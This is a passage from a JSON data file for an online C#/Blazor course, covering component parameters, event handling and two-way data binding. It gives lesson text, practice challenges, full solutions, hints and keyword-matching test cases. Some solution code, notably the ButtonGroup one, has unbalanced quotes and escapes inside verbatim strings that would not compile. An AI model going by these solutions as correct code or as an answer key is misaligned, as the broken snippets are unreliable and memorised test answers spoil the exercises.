ImageUrl=\"\"mouse.jpg\"\"\n                InStock=\"\"true\"\"\n                OnAddToCart=\"\"AddToCart\"\" />\n        </div>\n        \n        <div class=\"\"col-md-4\"\">\n            <ProductCard \n                Name=\"\"Monitor\"\" \n                Price=\"\"399.99m\"\" \n                ImageUrl=\"\"monitor.jpg\"\"\n                InStock=\"\"false\"\"\n                OnAddToCart=\"\"AddToCart\"\" />\n        </div>\n    </div>\n</div>\n\n@code {\n    private int cartCount = 0;\n    private List<string> cartItems = new();\n    \n    private void AddToCart(string productName)\n    {\n        cartCount++;\n        cartItems.Add(productName);\n        Console.WriteLine($\"\"Added {productName} to cart! Total: {cartCount}\"\");\n    }\n}\n\"\");\n\nConsole.WriteLine(@\"\n=== KEY CONCEPTS ===\");\nConsole.WriteLine(\"✓ [Parameter] - Makes property configurable from parent\");\nConsole.WriteLine(\"✓ EventCallback - Parent can respond to child events\");\nConsole.WriteLine(\"✓ Component reuse - Same ProductCard, different data\");\nConsole.WriteLine(\"✓ Conditional rendering - @if for In Stock badge\");\nConsole.WriteLine(\"\\n✓ ONE component definition → MANY instances!\");",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"ProductCard\"",
                  "expectedOutput": "ProductCard",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain \"ProductList\"",
                  "expectedOutput": "ProductList",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Output should contain \"[Parameter]\"",
                  "expectedOutput": "[Parameter]",
                  "isVisible": true
                },
                {
                  "id": "test-4",
                  "description": "Output should contain \"EventCallback\"",
                  "expectedOutput": "EventCallback",
                  "isVisible": true
                },
                {
                  "id": "test-5",
                  "description": "Output should contain \"InStock\"",
                  "expectedOutput": "InStock",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "[Parameter] for inputs. EventCallback<T> for events. @if for conditional rendering. Pass parameters as attributes. await callback.InvokeAsync() to trigger parent method."
                },
                {
                  "level": 2,
                  "text": "Parameter must be public: [Parameter] on private property doesn't work! Must be 'public string Name { get; set; }'. Public + [Parameter] attribute required."
                },
                {
                  "level": 3,
                  "text": "Forgetting @: In markup, '@Name' accesses parameter. Just 'Name' without @ is treated as literal text! Always use @ for C# variables/properties."
                },
                {
                  "level": 4,
                  "text": "EventCallback type: EventCallback (no data) or EventCallback<T> (with data). Use InvokeAsync() to trigger: 'await OnClick.InvokeAsync(value);'."
                },
                {
                  "level": 5,
                  "text": "Component filename mismatch: Alert.razor must contain component named Alert. Filename and component name MUST match exactly (case-sensitive!)."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Parameter must be public",
                  "consequence": "[Parameter] on private property doesn't work! Must be 'public string Name { get; set; }'. Public + [Parameter] attribute required.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Forgetting @",
                  "consequence": "In markup, '@Name' accesses parameter. Just 'Name' without @ is treated as literal text! Always use @ for C# variables/properties.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "EventCallback type",
                  "consequence": "EventCallback (no data) or EventCallback<T> (with data). Use InvokeAsync() to trigger: 'await OnClick.InvokeAsync(value);'.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Component filename mismatch",
                  "consequence": "Alert.razor must contain component named Alert. Filename and component name MUST match exactly (case-sensitive!).",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "advanced"
            }
          ]
        },
        {
          "id": "lesson-13-04",
          "title": "Component Parameters (Customization)",
          "moduleId": "module-13",
          "order": 4,
          "estimatedMinutes": 15,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Parameters are like function arguments for components!\n\nFunction with parameters:\nvoid Greet(string name, int age) { }\n\nComponent with parameters:\n<Person Name=\"Alice\" Age=\"30\" />\n\nParameters let you:\n✅ Customize component behavior\n✅ Pass data from parent to child\n✅ Make components reusable\n✅ Configure appearance/logic\n\nTypes of parameters:\n• Simple values (string, int, bool)\n• Complex objects (Product, Customer)\n• Collections (List<T>, arrays)\n• Event callbacks (EventCallback<T>)\n• RenderFragments (child content)\n\nThink: Parameters = 'The inputs that make your component flexible and reusable!'"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "// SIMPLE PARAMETERS\n@code {\n    [Parameter]\n    public string Title { get; set; } = \"Default Title\";\n    \n    [Parameter]\n    public int Count { get; set; } = 0;\n    \n    [Parameter]\n    public bool IsVisible { get; set; } = true;\n}\n\n// COMPLEX OBJECT PARAMETER\npublic class Product {\n    public string Name { get; set; }\n    public decimal Price { get; set; }\n}\n\n@code {\n    [Parameter]\n    public Product ProductData { get; set; }\n}\n<p>@ProductData.Name: $@ProductData.Price</p>\n\n// COLLECTION PARAMETER\n@code {\n    [Parameter]\n    public List<string> Items { get; set; } = new();\n}\n@foreach (var item in Items) {\n    <li>@item</li>\n}\n\n// EVENT CALLBACK PARAMETER\n@code {\n    [Parameter]\n    public EventCallback<int> OnValueChanged { get; set; }\n    \n    private async Task NotifyParent(int value) {\n        await OnValueChanged.InvokeAsync(value);\n    }\n}\n\n// CHILD CONTENT (RENDERFRAGMENT)\n@code {\n    [Parameter]\n    public RenderFragment ChildContent { get; set; }\n}\n<div class=\"card\">\n    @ChildContent\n</div>\n// Usage: <Card><p>This goes inside!</p></Card>\n\n// CASCADING PARAMETERS\n<CascadingValue Value=\"@currentUser\">\n    <ChildComponent />  // Receives currentUser automatically\n</CascadingValue>\n\n@code {\n    [CascadingParameter]\n    public User CurrentUser { get; set; }\n}",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`[Parameter] public Type Name { get; set; }`**: Standard parameter. Must be public with [Parameter] attribute. Can set default value with = \"default\". Passed from parent component.\n\n**`EventCallback<T>`**: Parameter for events. T is data type passed to parent. Use InvokeAsync(value) to trigger. EventCallback (no <T>) for no data.\n\n**`RenderFragment`**: Special parameter type for child content. Lets parent pass HTML/components as parameter. Name it 'ChildContent' for default slot.\n\n**`[CascadingParameter]`**: Receives value from CascadingValue ancestor. No need to pass through every level! Useful for themes, user context, etc."
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
              "content": "## Watch Out For These Issues\n\n**No [Required] attribute**: Blazor has no built-in required parameter validation! Check manually in OnParametersSet: `if (string.IsNullOrEmpty(Name)) throw new InvalidOperationException(\"Name required\");`\n\n**Two-way binding naming**: For @bind-Value, you need BOTH `[Parameter] public T Value { get; set; }` AND `[Parameter] public EventCallback<T> ValueChanged { get; set; }`. Exact naming required!\n\n**EventCallback vs Action**: Use EventCallback, not Action! EventCallback triggers StateHasChanged automatically. Action won't re-render the component.\n\n**RenderFragment naming**: Name it exactly 'ChildContent' for implicit slot: `<MyComponent><p>This works!</p></MyComponent>`. Other names need explicit: `<MyComponent><Header>...</Header></MyComponent>`.\n\n**CascadingParameter performance**: Don't cascade frequently-changing values! Every change re-renders all consumers. Use for stable data like themes, auth state.\n\n**Reference type parameters**: Object parameters share reference! Modifying child affects parent. Use immutable objects or clone if needed."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-13-04-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Build a flexible Button component with many parameters!\n\n1. CustomButton.razor:\n   - [Parameter] string Text\n   - [Parameter] string Color (\"primary\", \"danger\", \"success\")\n   - [Parameter] bool IsDisabled\n   - [Parameter] EventCallback OnClick\n   - Apply Bootstrap classes based on Color\n   - Disable if IsDisabled\n\n2. ButtonGroup.razor that uses CustomButton:\n   - Create 3 buttons: Save (success), Delete (danger), Cancel (primary)\n   - Track which button was clicked\n   - Display last action\n\n3. Demonstrate parameter flexibility\n\nPrint both components!",
              "starterCode": "// CustomButton.razor\n<button \n    class=\"btn btn-@Color\" \n    disabled=\"@IsDisabled\"\n    @onclick=\"HandleClick\">\n    @Text\n</button>\n\n@code {\n    [Parameter]\n    public string Text { get; set; } = \"Button\";\n    \n    [Parameter]\n    public string Color { get; set; } = \"primary\";\n    \n    [Parameter]\n    public bool IsDisabled { get; set; } = false;\n    \n    [Parameter]\n    public EventCallback OnClick { get; set; }\n    \n    private async Task HandleClick()\n    {\n        if (!IsDisabled)\n            await OnClick.InvokeAsync();\n    }\n}\n\n// ButtonGroup.razor\n<div>\n    <h4>Actions</h4>\n    \n    <CustomButton \n        Text=\"Save\" \n        Color=\"success\" \n        OnClick=\"() => HandleAction(\\\"Save\\\")\" />\n    \n    <!-- Add Delete and Cancel buttons -->\n    \n    <p class=\"mt-3\">Last Action: @lastAction</p>\n</div>\n\n@code {\n    private string lastAction = \"None\";\n    \n    private void HandleAction(string action)\n    {\n        lastAction = action;\n    }\n}",
              "solution": "using System;\n\nConsole.WriteLine(@\"\n=== CUSTOMBUTTON COMPONENT ===\");\nConsole.WriteLine(@\"\n// CustomButton.razor\n<button \n    class=\"\"btn btn-@Color @(IsDisabled ? \\\"\"disabled\\\"\" : \"\"\"\")\"\" \n    disabled=\"\"@IsDisabled\"\"\n    @onclick=\"\"HandleClick\"\"\n    style=\"\"margin: 5px;\"\">\n    @Text\n</button>\n\n@code {\n    [Parameter]\n    public string Text { get; set; } = \"\"Button\"\";\n    \n    [Parameter]\n    public string Color { get; set; } = \"\"primary\"\";\n    \n    [Parameter]\n    public bool IsDisabled { get; set; } = false;\n    \n    [Parameter]\n    public EventCallback<string> OnClick { get; set; }\n    \n    private async Task HandleClick()\n    {\n        if (!IsDisabled)\n        {\n            Console.WriteLine($\"\"Button '{Text}' clicked!\"\");\n            await OnClick.InvokeAsync(Text);\n        }\n    }\n}\n\"\");\n\nConsole.WriteLine(@\"\n=== BUTTONGROUP COMPONENT ===\");\nConsole.WriteLine(@\"\n// ButtonGroup.razor\n<div class=\"\"button-group-demo\"\">\n    <h4>Action Buttons</h4>\n    \n    <div class=\"\"btn-group\"\">\n        <CustomButton \n            Text=\"\"Save\"\" \n            Color=\"\"success\" \n            IsDisabled=\"\"false\"\n            OnClick=\"\"HandleAction\"\" />\n        \n        <CustomButton \n            Text=\"\"Delete\"\" \n            Color=\"\"danger\" \n            IsDisabled=\"\"false\"\n            OnClick=\"\"HandleAction\"\" />\n        \n        <CustomButton \n            Text=\"\"Cancel\"\" \n            Color=\"\"secondary\" \n            IsDisabled=\"\"false\"\n            OnClick=\"\"HandleAction\"\" />\n        \n        <CustomButton \n            Text=\"\"Disabled\"\" \n            Color=\"\"primary\" \n            IsDisabled=\"\"true\"\n            OnClick=\"\"HandleAction\"\" />\n    </div>\n    \n    <div class=\"\"alert alert-info mt-3\"\">\n        <strong>Last Action:</strong> @lastAction\n    </div>\n    \n    @if (actionCount > 0)\n    {\n        <p><small>Total actions: @actionCount</small></p>\n    }\n</div>\n\n@code {\n    private string lastAction = \"\"None\"\";\n    private int actionCount = 0;\n    \n    private void HandleAction(string buttonText)\n    {\n        lastAction = buttonText;\n        actionCount++;\n        Console.WriteLine($\"\"Action performed: {buttonText} (Total: {actionCount})\"\");\n    }\n}\n\"\");\n\nConsole.WriteLine(@\"\n=== PARAMETER BENEFITS ===\");\nConsole.WriteLine(\"✓ ONE CustomButton component\");\nConsole.WriteLine(\"✓ MULTIPLE instances with different:\");\nConsole.WriteLine(\"  - Text (\\\"Save\\\", \\\"Delete\\\", \\\"Cancel\\\")\");\nConsole.WriteLine(\"  - Color (success, danger, secondary)\");\nConsole.WriteLine(\"  - IsDisabled (true/false)\");\nConsole.WriteLine(\"  - OnClick (different actions)\");\nConsole.WriteLine(\"\\n✓ Reusability + Flexibility = Powerful components!\");",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"CustomButton\"",
                  "expectedOutput": "CustomButton",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain \"ButtonGroup\"",
                  "expectedOutput": "ButtonGroup",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Output should contain \"[Parameter]\"",
                  "expectedOutput": "[Parameter]",
                  "isVisible": true
                },
                {
                  "id": "test-4",
                  "description": "Output should contain \"Color\"",
                  "expectedOutput": "Color",
                  "isVisible": true
                },
                {
                  "id": "test-5",
                  "description": "Output should contain \"IsDisabled\"",
                  "expectedOutput": "IsDisabled",
                  "isVisible": true
                },
                {
                  "id": "test-6",
                  "description": "Output should contain \"OnClick\"",
                  "expectedOutput": "OnClick",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "[Parameter] makes property configurable. EventCallback<T> for passing data back. Invoke with await callback.InvokeAsync(data). Bootstrap: btn-primary, btn-success, btn-danger."
                },
                {
                  "level": 2,
                  "text": "Required parameters: No built-in [Required] for Blazor parameters! Check in OnParametersSet(): 'if (string.IsNullOrEmpty(Name)) throw new ArgumentNullException();'."
                },
                {
                  "level": 3,
                  "text": "Parameter change detection: OnParametersSet() called when parent changes parameters. Use to react: 'protected override void OnParametersSet() { UpdateData(); }'."
                },
                {
                  "level": 4,
                  "text": "Two-way binding: For @bind, need [Parameter] Value AND [Parameter] ValueChanged EventCallback<T>. Or use @bind-Value syntax. Naming convention matters!"
                },
                {
                  "level": 5,
                  "text": "Default values: Set default in property initializer or constructor, NOT in OnInitialized! Property initializer: 'public string Color { get; set; } = \"primary\";'."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Required parameters",
                  "consequence": "No built-in [Required] for Blazor parameters! Check in OnParametersSet(): 'if (string.IsNullOrEmpty(Name)) throw new ArgumentNullException();'.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Parameter change detection",
                  "consequence": "OnParametersSet() called when parent changes parameters. Use to react: 'protected override void OnParametersSet() { UpdateData(); }'.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Two-way binding",
                  "consequence": "For @bind, need [Parameter] Value AND [Parameter] ValueChanged EventCallback<T>. Or use @bind-Value syntax. Naming convention matters!",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Default values",
                  "consequence": "Set default in property initializer or constructor, NOT in OnInitialized! Property initializer: 'public string Color { get; set; } = \"primary\";'.",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "advanced"
            }
          ]
        },
        {
          "id": "lesson-13-05",
          "title": "Event Handling (@onclick, @onchange)",
          "moduleId": "module-13",
          "order": 5,
          "estimatedMinutes": 15,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Events are like doorbells:\n\nUser clicks button = Someone rings doorbell\nYour C# method runs = You answer the door\n\nBlazor events:\n• @onclick - Button clicks, div clicks\n• @onchange - Input value changes\n• @oninput - Every keystroke\n• @onsubmit - Form submission\n• @onmouseover - Mouse hover\n\nEvent handling:\n1. User interacts (click, type, hover)\n2. Browser fires event\n3. Blazor calls your C# method\n4. Method updates state\n5. UI re-renders automatically!\n\nThink: Events = 'User does something → Your C# code responds!'"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "// CLICK EVENTS\n<button @onclick=\"HandleClick\">Click Me</button>\n<button @onclick=\"() => count++\">Increment</button>\n<button @onclick=\"@(() => DoWork(5))\">Pass Parameter</button>\n\n@code {\n    private void HandleClick() {\n        Console.WriteLine(\"Button clicked!\");\n    }\n    \n    private void DoWork(int value) {\n        Console.WriteLine($\"Working with {value}\");\n    }\n}\n\n// CHANGE EVENTS\n<input @onchange=\"HandleNameChange\" />\n<select @onchange=\"HandleCategoryChange\">\n    <option>Category 1</option>\n</select>\n\n@code {\n    private void HandleNameChange(ChangeEventArgs e) {\n        string newValue = e.Value.ToString();\n        Console.WriteLine($\"Name changed to: {newValue}\");\n    }\n}\n\n// INPUT EVENTS (every keystroke)\n<input @oninput=\"HandleInput\" />\n<p>You typed: @currentInput</p>\n\n@code {\n    private string currentInput = \"\";\n    \n    private void HandleInput(ChangeEventArgs e) {\n        currentInput = e.Value.ToString();\n    }\n}\n\n// KEYBOARD EVENTS\n<input @onkeydown=\"HandleKeyDown\" @onkeyup=\"HandleKeyUp\" />\n\n@code {\n    private void HandleKeyDown(KeyboardEventArgs e) {\n        if (e.Key == \"Enter\") {\n            Console.WriteLine(\"Enter pressed!\");\n        }\n    }\n}\n\n// MOUSE EVENTS\n<div @onmouseover=\"() => isHovered = true\" \n     @onmouseout=\"() => isHovered = false\"\n     class=\"@(isHovered ? \\\"highlight\\\" : \\\"\\\")\">\n    Hover over me!\n</div>\n\n// FORM SUBMIT\n<EditForm Model=\"@person\" OnValidSubmit=\"HandleSubmit\">\n    <button type=\"submit\">Submit</button>\n</EditForm>\n\n@code {\n    private Person person = new();\n    \n    private void HandleSubmit() {\n        Console.WriteLine(\"Form submitted!\");\n    }\n}",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`@onclick=\"MethodName\"`**: Calls C# method on click. No parentheses if no parameters. For lambda: @onclick=\"() => code\". Event fires, method runs, UI updates.\n\n**`ChangeEventArgs`**: Event argument object. Use e.Value for new value. Different types: KeyboardEventArgs, MouseEventArgs, FocusEventArgs, etc.\n\n**`@oninput vs @onchange`**: @oninput fires on every keystroke. @onchange fires when input loses focus (blur). Use @oninput for live updates, @onchange for final value.\n\n**`Event with parameters`**: Use lambda to pass parameters: @onclick=\"() => Delete(item.Id)\". Or: @onclick=\"@(() => Process(item))\". Lambda wraps method call."
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
              "content": "## Watch Out For These Issues\n\n**Foreach variable capture**: In foreach, use lambda carefully! `@onclick=\"() => Delete(item)\"` captures reference. If collection changes, wrong item deleted! Copy to local: `var localItem = item;`\n\n**Event bubbling**: Click on child AND parent fires both handlers! Use `@onclick:stopPropagation` to prevent bubbling. Or handle in only one place.\n\n**Async void danger**: Don't use `async void` for event handlers! Exceptions are lost. Use `async Task` and Blazor handles it: `private async Task HandleClick() { ... }`\n\n**@oninput performance**: Fires on EVERY keystroke! In large apps, debounce or use @onchange. Every keystroke = re-render.\n\n**Missing await in async handler**: `await OnClick.InvokeAsync()` - forgetting await means parent handler might not complete before continuing.\n\n**Wrong event args type**: MouseEventArgs for mouse, KeyboardEventArgs for keyboard, ChangeEventArgs for input. Wrong type = runtime error. Check docs for correct type."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-13-05-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Create an interactive task manager with events!\n\n1. TaskManager component:\n   - Input for task name (@oninput updates as you type)\n   - Button \"Add Task\" (@onclick)\n   - List of tasks\n   - Each task has:\n     - Checkbox (@onchange to mark complete)\n     - Delete button (@onclick)\n   - Show count of total and completed tasks\n\n2. Events to handle:\n   - Input change (live preview)\n   - Add task (button click)\n   - Toggle complete (checkbox change)\n   - Delete task (button click)\n\n3. Print component structure!",
              "starterCode": "// TaskManager.razor\n<div class=\"task-manager\">\n    <h3>Task Manager</h3>\n    \n    <div class=\"input-group\">\n        <input \n            @oninput=\"HandleTaskInput\" \n            @onkeydown=\"HandleKeyPress\"\n            placeholder=\"Enter task name\" />\n        <button @onclick=\"AddTask\">Add Task</button>\n    </div>\n    \n    <p>Preview: @currentTaskName</p>\n    \n    <ul>\n        @foreach (var task in tasks)\n        {\n            <li>\n                <input \n                    type=\"checkbox\" \n                    checked=\"@task.IsCompleted\"\n                    @onchange=\"() => ToggleTask(task.Id)\" />\n                <span class=\"@(task.IsCompleted ? \\\"completed\\\" : \\\"\\\")\">@task.Name</span>\n                <button @onclick=\"() => DeleteTask(task.Id)\">Delete</button>\n            </li>\n        }\n    </ul>\n    \n    <p>Total: @tasks.Count | Completed: @tasks.Count(t => t.IsCompleted)</p>\n</div>\n\n@code {\n    // Implement task management\n}",
              "solution": "Console.WriteLine(@\"\n// TaskManager.razor\nusing System;\nusing System.Collections.Generic;\nusing System.Linq;\n\n<div class=\"\"task-manager\"\">\n    <h3>📝 Task Manager</h3>\n    \n    <div class=\"\"input-group mb-3\"\">\n        <input \n            class=\"\"form-control\"\"\n            @bind=\"\"currentTaskName\"\"\n            @onkeydown=\"\"HandleKeyPress\"\"\n            placeholder=\"\"Enter task name\"\" />\n        <button class=\"\"btn btn-primary\"\" @onclick=\"\"AddTask\"\">Add Task</button>\n    </div>\n    \n    <div class=\"\"alert alert-info\"\">\n        Preview: @(string.IsNullOrEmpty(currentTaskName) ? \"\"(empty)\"\" : currentTaskName)\n    </div>\n    \n    <ul class=\"\"list-group\"\">\n        @foreach (var task in tasks)\n        {\n            <li class=\"\"list-group-item\"\">\n                <input \n                    type=\"\"checkbox\"\" \n                    checked=\"\"@task.IsCompleted\"\"\n                    @onchange=\"\"() => ToggleTask(task.Id)\"\" />\n                <span class=\"\"@(task.IsCompleted ? \\\"\"text-decoration-line-through\\\"\" : \"\"\"\")\"\">\n                    @task.Name\n                </span>\n                <button \n                    class=\"\"btn btn-sm btn-danger float-end\"\" \n                    @onclick=\"\"() => DeleteTask(task.Id)\"\">Delete</button>\n            </li>\n        }\n    </ul>\n    \n    <div class=\"\"mt-3\"\">\n        <strong>Total: @tasks.Count</strong> | \n        <strong>Completed: @tasks.Count(t => t.IsCompleted)</strong> |\n        <strong>Remaining: @tasks.Count(t => !t.IsCompleted)</strong>\n    </div>\n</div>\n\n@code {\n    private class TaskItem {\n        public int Id { get; set; }\n        public string Name { get; set; } = \"\"\"\";\n        public bool IsCompleted { get; set; }\n    }\n    \n    private List<TaskItem> tasks = new();\n    private string currentTaskName = \"\"\"\";\n    private int nextId = 1;\n    \n    private void AddTask() {\n        if (!string.IsNullOrWhiteSpace(currentTaskName)) {\n            tasks.Add(new TaskItem { \n                Id = nextId++, \n                Name = currentTaskName, \n                IsCompleted = false \n            });\n            currentTaskName = \"\"\"\";\n            Console.WriteLine($\"\"Task added! Total: {tasks.Count}\"\");\n        }\n    }\n    \n    private void HandleKeyPress(KeyboardEventArgs e) {\n        if (e.Key == \"\"Enter\"\") {\n            AddTask();\n        }\n    }\n    \n    private void ToggleTask(int taskId) {\n        var task = tasks.FirstOrDefault(t => t.Id == taskId);\n        if (task != null) {\n            task.IsCompleted = !task.IsCompleted;\n            Console.WriteLine($\"\"{task.Name}: {(task.IsCompleted ? \\\"\"Completed\\\"\" : \\\"\"Incomplete\\\"\")}\"\");\n        }\n    }\n    \n    private void DeleteTask(int taskId) {\n        var task = tasks.FirstOrDefault(t => t.Id == taskId);\n        if (task != null) {\n            tasks.Remove(task);\n            Console.WriteLine($\"\"Deleted: {task.Name}\"\");\n        }\n    }\n}\n\"\");\n\nConsole.WriteLine(@\"\n=== EVENTS DEMONSTRATED ===\");\nConsole.WriteLine(\"✓ @bind - Two-way binding for input\");\nConsole.WriteLine(\"✓ @onkeydown - Enter key to add task\");\nConsole.WriteLine(\"✓ @onclick - Add and Delete buttons\");\nConsole.WriteLine(\"✓ @onchange - Checkbox toggle\");\nConsole.WriteLine(\"✓ Lambda with parameters: () => DeleteTask(id)\");\nConsole.WriteLine(\"\\n✓ All events → C# methods → UI updates!\");",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Output should contain \"TaskManager\"",
                  "expectedOutput": "TaskManager",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Output should contain \"@onclick\"",
                  "expectedOutput": "@onclick",
                  "isVisible": true
                },
                {
                  "id": "test-3",
                  "description": "Output should contain \"@onchange\"",
                  "expectedOutput": "@onchange",
                  "isVisible": true
                },
                {
                  "id": "test-4",
                  "description": "Output should contain \"@bind\"",
                  "expectedOutput": "@bind",
                  "isVisible": true
                },
                {
                  "id": "test-5",
                  "description": "Output should contain \"ToggleTask\"",
                  "expectedOutput": "ToggleTask",
                  "isVisible": true
                },
                {
                  "id": "test-6",
                  "description": "Output should contain \"DeleteTask\"",
                  "expectedOutput": "DeleteTask",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "@onclick for buttons. @onchange for checkbox. @bind for two-way input binding. @onkeydown to detect Enter key. Use lambdas to pass parameters: () => Method(id)."
                },
                {
                  "level": 2,
                  "text": "Event propagation: @onclick on parent and child? Both fire! Use @onclick:stopPropagation to prevent bubbling. Or handle in only one place."
                },
                {
                  "level": 3,
                  "text": "Async event handlers: Can use async methods! '@onclick=\"HandleClickAsync\"' with 'private async Task HandleClickAsync()'. Blazor awaits automatically."
                },
                {
                  "level": 4,
                  "text": "Event args: Different events have different args! ChangeEventArgs for input/select, MouseEventArgs for mouse, KeyboardEventArgs for keyboard. Check e.Key, e.Button, etc."
                },
                {
                  "level": 5,
                  "text": "Lambda scope: Variables in lambda must be in scope! '@onclick=\"() => Delete(item.Id)\"' in foreach works. Outside foreach, 'item' not available!"
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Event propagation",
                  "consequence": "@onclick on parent and child? Both fire! Use @onclick:stopPropagation to prevent bubbling. Or handle in only one place.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Async event handlers",
                  "consequence": "Can use async methods! '@onclick=\"HandleClickAsync\"' with 'private async Task HandleClickAsync()'. Blazor awaits automatically.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Event args",
                  "consequence": "Different events have different args! ChangeEventArgs for input/select, MouseEventArgs for mouse, KeyboardEventArgs for keyboard. Check e.Key, e.Button, etc.",
                  "correction": "Review the correct syntax and best practices for this concept."
                },
                {
                  "mistake": "Lambda scope",
                  "consequence": "Variables in lambda must be in scope! '@onclick=\"() => Delete(item.Id)\"' in foreach works. Outside foreach, 'item' not available!",
                  "correction": "Review the correct syntax and best practices for this concept."
                }
              ],
              "difficulty": "advanced"
            }
          ]
        },
        {
          "id": "lesson-13-06",
          "title": "Data Binding (@bind Directive)",
          "moduleId": "module-13",
          "order": 6,
          "estimatedMinutes": 15,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Data binding is like a two-way mirror:\n\nONE-WAY (display only):\nC# variable → @variable → Shows in UI\nIf variable changes, UI updates\n\nTWO-WAY (@bind):\nC# variable ⟷ @bind ⟷ Input field\nVariable changes → UI updates\nUser types → Variable updates\nIt's AUTOMATIC!\n\nWithout @bind:\n<input value=\"@name\" @oninput=\"e => name = e.Value.ToString()\" />\n\nWith @bind:\n<input @bind=\"name\" />\n\nMuch simpler! Blazor handles sync automatically.\n\nThink: @bind = 'Keep C# variable and UI input perfectly in sync, both ways!'"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "// SIMPLE BINDING\n<input @bind=\"name\" />\n<p>Hello, @name!</p>\n\n@code {\n    private string name = \"\";\n}\n\n// BINDING WITH DIFFERENT TYPES\n<input @bind=\"age\" type=\"number\" />\n<input @bind=\"birthDate\" type=\"date\" />\n<input type=\"checkbox\" @bind=\"isActive\" />\n<select @bind=\"category\">\n    <option>Electronics</option>\n    <option>Clothing</option>\n</select>\n\n@code {\n    private int age;\n    private DateTime birthDate = DateTime.Now;\n    private bool isActive;\n    private string category = \"Electronics\";\n}\n\n// BINDING EVENTS\n<input @bind=\"searchTerm\" @bind:event=\"oninput\" />\n// Updates on every keystroke!\n\n<input @bind=\"email\" @bind:event=\"onchange\" />\n// Updates when focus lost (default)\n\n// BINDING WITH FORMATTING\n<input @bind=\"price\" @bind:format=\"C2\" />\n// Displays as currency: $99.99\n\n<input @bind=\"date\" @bind:format=\"yyyy-MM-dd\" />\n// Custom date format\n\n// COMPONENT TWO-WAY BINDING\n// Parent:\n<Counter @bind-Count=\"myCount\" />\n<p>Parent knows: @myCount</p>\n\n// Counter component:\n@code {\n    [Parameter]\n    public int Count { get; set; }\n    \n    [Parameter]\n    public EventCallback<int> CountChanged { get; set; }\n    \n    private async Task IncrementCount() {\n        Count++;\n        await CountChanged.InvokeAsync(Count);\n    }\n}\n// Naming: Count + CountChanged",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`@bind=\"variable\"`**: Two-way binding. Variable ↔ input. User types → variable updates. Variable changes → input updates. Automatic sync!\n\n**`@bind:event=\"oninput\"`**: Control when binding updates. 'oninput' = every keystroke. 'onchange' = on blur (default for text inputs). Choose based on performance needs.\n\n**`@bind:format`**: Format display value. 'C2' = currency. 'yyyy-MM-dd' = date format. 'P' = percentage. Format doesn't change underlying value, just display.\n\n**`@bind-PropertyName`**: Component two-way binding. Requires: [Parameter] Property AND [Parameter] PropertyChanged EventCallback. @bind-Count binds to Count parameter."
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
